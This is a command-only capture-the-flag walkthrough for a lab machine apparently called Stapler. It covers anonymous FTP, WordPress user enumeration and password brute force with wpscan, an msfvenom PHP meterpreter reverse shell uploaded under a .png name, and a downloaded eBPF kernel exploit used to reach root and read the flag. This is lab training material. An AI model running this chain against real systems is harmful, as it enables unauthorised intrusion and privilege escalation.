@@ -1,0 +1,144 @@
+nmap -sV -sC -sT -p- 10.X.X.X
+
+ftp-anon: Anonymous FTP login allowed (FTP code 230)
+
+
+ftp 10.X.X.X
+
+Harry, make sure to update the banner when you get a chance to show who has access here
+
+username anonymous   password anonymous
+
+|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+
+dir
+get note
+
+Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.
+
+|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+
+http://10.X.X.X:12380/
+
+|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+
+nikto -h 10.X.X.X:12380 
+
+|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+
+https://10.X.X.X:12380/blogblog/
+
+
+|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+
+wpscan --url https://10.X.X.X:12380/blogblog/ --disable-tls-checks
+
+
+wpscan --url https://10.X.X.X:12380/blogblog/ --disable-tls-checks --enumerate u
+
+
+wpscan --url https://10.X.X.X:12380/blogblog/ --disable-tls-checks --usernames john --passwords /usr/share/wordlists/rockyou.txt -t 150 --password-attack wp-login
+
+Username: john, Password: incorrect
+
+|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+
+https://10.X.X.X:12380/blogblog/wp-login.php?redirect_to=https%3A%2F%2F10.0.2.24%3A12380%2Fblogblog%2Fwp-admin%2F&reauth=1
+
+|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+
+msfvenom -p php/meterpreter/reverse_tcp LHOST=10.X.X.X LPORT=1515 -f raw > staplershell.php 
+
+|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+
+use exploit/multi/handler 
+
+set payload php/meterpreter/reverse_tcp
+
+show options
+
+set LHOST and LPORT
+
+exploit -j -z
+
+|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+
+cp staplershell.php staplershell.php.png
+
+upload your shell and run
+
+|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+
+session -l
+session -1
+
+|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+
+sysinfo
+
+cd /
+
+cd tmp
+
+|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+
+open shell -> shell
+
+ps
+
+git clone https://github.com/rebootuser/LinEnum.git
+
+
+bash LinEnum.sh
+
+|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+
+wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
+
+ls
+bash les.sh
+
+|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+
+possible exploits
+
+https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/39772.zip
+
+ls
+unzip 39772.zip 
+ls
+cd 39772
+ls
+
+tar xf exploit.tar
+ls
+cd ebpf_mapfd_doubleput_exploit
+ls
+
+bash compile.sh
+ls
+./doubleput
+
+
+|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+
+whoami
+
+cd /
+cd root
+cat flag.txt
+
+~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
+                          .-'''''-.
+                          |'-----'|
+                          |-.....-|
+                          |       |
+                          |       |
+         _,._             |       |
+    __.o`   o`"-.         |       |
+ .-O o `"-.o   O )_,._    |       |
+( o   O  o )--.-"`O   o"-.`'-----'`
+ '--------'  (   o  O    o)  
+              `----------`
+b6b545dc11b7a270f4bad23432190c75162c4a2b
+
